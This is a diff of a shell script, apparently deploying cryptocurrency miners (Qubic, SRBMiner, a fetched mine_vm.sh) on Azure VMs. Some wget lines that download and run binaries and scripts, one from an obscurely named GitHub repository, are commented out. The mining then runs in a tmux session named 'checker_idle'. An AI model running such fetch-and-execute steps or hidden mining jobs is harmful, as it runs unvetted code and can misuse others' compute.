@@ -16,19 +16,19 @@ fi
 wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v1.0.10/rqiner-x86-cascadelake -P /home/azureuser/qub_dir -N
 chmod 777 /home/azureuser/qub_dir/rqiner-x86-cascadelake
 ################################# НОВЫЙ ВЕРУС ВАЙПЕР ПУЛ
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.6/SRBMiner-Multi-2-6-6-Linux.tar.gz -P /home/azureuser -N
-tar -xf /home/azureuser/SRBMiner-Multi-2-6-6-Linux.tar.gz
-mv /home/azureuser/SRBMiner-Multi-2-6-6/* /home/azureuser
+#wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.6/SRBMiner-Multi-2-6-6-Linux.tar.gz -P /home/azureuser -N
+#tar -xf /home/azureuser/SRBMiner-Multi-2-6-6-Linux.tar.gz
+#mv /home/azureuser/SRBMiner-Multi-2-6-6/* /home/azureuser
 
 #################################################################################################
 
 sudo /usr/sbin/sysctl -w vm.nr_hugepages=480
 
 #### ПОД КУБИР И ХМР СВИТЧ СДЕЛАЛ
-cd /home/azureuser
-wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser -N
-chmod +x /home/azureuser/mine_vm.sh
-tmux kill-session -t checker_idle
+#cd /home/azureuser
+#wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/mine_vm.sh -P /home/azureuser -N
+#chmod +x /home/azureuser/mine_vm.sh
+#tmux kill-session -t checker_idle
 tmux new -ds checker_idle /home/azureuser/mine_vm.sh 
 
 #echo TEXT="$((RANDOM % 999999 + 2))" >> /home/azureuser/.bashrc
